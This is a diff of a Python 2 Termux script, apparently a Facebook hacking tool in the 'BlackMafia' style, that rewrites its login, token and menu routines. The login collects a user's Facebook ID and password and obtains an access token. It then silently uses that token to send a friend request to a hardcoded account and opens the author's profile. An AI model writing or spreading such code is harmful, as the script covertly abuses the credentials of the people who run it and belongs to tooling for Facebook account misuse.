@@ -228,7 +228,7 @@ def masuk():
 	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
 	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
 	print "\033[1;95m║"
-	msuk = raw_input("\033[1;96m╚═\033[1;1mSlect option\033[1;93m")
+	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
 	if msuk =="":
 		print"\033[1;91m[!] Wrong input"
 		keluar()
@@ -242,58 +242,24 @@ def masuk():
 		print"\033[1;91m[!] Wrong input"
 		keluar()
 		
+##### LOGIN #####
+#================#
 def login():
-	os.system('clear')
+	os.system('reset')
 	try:
 		toket = open('login.txt','r')
 		menu() 
 	except (KeyError,IOError):
-		os.system('clear')
+		os.system('reset')
 		print logo
-                jalan(' \033[1;91m╔══╗───█──────────█▀────╔══╗')
-                jalan(' \033[1;91m║─╔╬═╗─█▄─────────█▀──╔═╬╗─║')
-                jalan(' \033[1;91m╚═╬╝╔╬═╗──█▀█─█─█─▀▀╔═╬╗╚╬═╝')
-                jalan(' \033[1;91m──╚═╬╝╔╬═╗█▄█─▀▄▀─╔═╬╗╚╬═╝──')
-                jalan(' \033[1;91m────╚═╬╝╔╬═╗────╔═╬╗╚╬═╝────')
-                jalan(' \033[1;91m──────╚═╬╝╔╬═╗╔═╬╗╚╬═╝──────')
-                jalan(' \033[1;91m────────╚═╬╝╔╬╬╗╚╬═╝────────')
-                jalan(' \033[1;91m──────────╚═╬╝╚╬═╝──────────')
-                jalan(' \033[1;91m────────────╚══╝────────────')
-	        jalan(' \033[1;93mWarning: \033[1;95mDo Not Use Your Personal Account' )
-	        jalan(' \033[1;93mWarning: \033[1;95mUse a New Account To Login' )
-	        jalan(' \033[1;93mWarning: \033[1;95mTermux  All version Work✅' )
-	        print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	        print('	   \033[1;91m▬\x1b[1;95m.........LOGIN WITH FACEBOOK........\x1b[1;91m▬' )
-	        print('	' )
-		print"\033[1;91m[!] Wrong input"
-		keluar()
-	        id = raw_input('\033[1;91m[+] \x1b[1;91mID/Login Facebook\x1b[1;95m: \x1b[1;95m')
-	        pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;95m: \x1b[1;95m')
-                e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
-		if e =="":
-			keluar()
-		elif e =="y":
-			login()
-		else:
-			keluar()
-	        tik()
-                os.system('reset')
-	        print logo
-	        toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
-	        try:
-			otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-			a = json.loads(otw.text)
-			nama = a['name']
-			zedd = open("login.txt", 'w')
-			zedd.write(toket)
-			zedd.close()
-			menu()
-                except KeyError:
-			print "\033[1;91m[!] Wrong"
+		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
+		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
+		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
+		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;91mThere is no internet connection"
+			print"\n\033[1;91m[!] No connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -312,27 +278,28 @@ def login():
 				url = "https://api.facebook.com/restserver.php"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				zedd = open("login.txt", 'w')
+				zedd.write(z['access_token'])
+				zedd.close()
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://www.facebook.com/rendi.andika.3133')
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91mThere is no internet connection"
+				print"\n\033[1;91m[!] No connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;91mYour Account is on Checkpoint")
+			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[#] Harap Login Ulang !")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\033[1;91m[!] Login Failed")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
-
+			
 ##### TOKEN #####
 def tokenz():
 	os.system('reset')
@@ -356,14 +323,14 @@ def tokenz():
 		else:
 			keluar()
 			
-
+##### MENU ##########################################
 def menu():
-	os.system('clear')
+	os.system('reset')
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		os.system('clear')
-		print"\x1b[1;91mToken invalid"
+		os.system('reset')
+		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -373,15 +340,15 @@ def menu():
 		nama = a['name']
 		id = a['id']
 	except KeyError:
-		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		os.system('reset')
+		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;91mThere is no internet connection"
+		print"\033[1;91m[!] No connection"
 		keluar()
-	os.system("clear") #Dev:love_hacker
+	os.system("reset")#Dev:love_hacker
 	print logo
 	print "  \033[1;95m«----•◈••◈•----\033[1;91mLogged in User Info\033[1;95m----•◈••◈•-----»"
 	print "	   \033[1;91m Name\033[1;91m:\033[1;91m"+nama+"\033[1;95m               "
